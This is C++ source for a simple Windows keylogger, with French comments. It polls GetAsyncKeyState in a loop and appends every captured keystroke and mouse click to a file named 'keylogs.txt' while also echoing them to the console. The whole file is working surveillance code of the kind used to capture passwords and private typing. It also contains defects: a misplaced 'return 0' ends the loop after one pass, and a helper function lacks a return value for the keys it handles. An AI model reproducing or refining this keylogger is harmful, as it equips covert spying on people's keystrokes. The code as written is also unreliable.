#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>


using namespace std;

void WriteToLog(LPCSTR text){
    ofstream logfile; //crée un objet pour le flux de fichiers
    logfile.open("keylogs.txt", fstream::app); //ouvre le fichier pour l'écriture
    logfile << text; //écrit une chaîne de texte dans le fichier
    logfile.close(); //ferme le flux
}

bool KeyIsListed(int iKey){
    switch(iKey){
    case VK_SPACE:
        cout << " "; //la barre d'espace est enfoncée, imprimer l'espace sur la console
        WriteToLog(" "); //écrire de l'espace dans le logfile
        break;
    case VK_RETURN:
        cout << "\n"; //idem ci-dessus, sauf que maintenant 'enter' compte
        WriteToLog("\n");
        break;
    case VK_SHIFT:
        cout << " *Shift* ";
        WriteToLog(" *Shift* ");
        break;
    case VK_BACK:
        cout << "\b"; //émule le retour arrière
        WriteToLog("\b");
        break;
    case VK_RBUTTON:
        cout << " *rclick* ";
        WriteToLog(" *rclick* ");
        break;
    case VK_LBUTTON:
        cout << " *lclick* ";
        WriteToLog(" *lclick* ");
        break;
    default: return false; //nous en avons besoin plus tard pour déterminer si la clé existe dans cette liste
    }

}

int main()
{
    char key;
    while(TRUE){
        Sleep(10);
        for (key = 8; key <= 190; key++){
            if(GetAsyncKeyState(key) == -32767){
                    if(KeyIsListed(key) == FALSE){
                        cout << key;
                        ofstream logfile; //crée un objet pour le flux de fichiers
                        logfile.open("keylogs.txt", fstream::app); //ouvre le fichier pour l'écriture
                        logfile << key; //écrit le caractère de logged key dans le fichier
                        logfile.close(); //ferme le flux
                }
            }
        }
    return 0;
    }
}

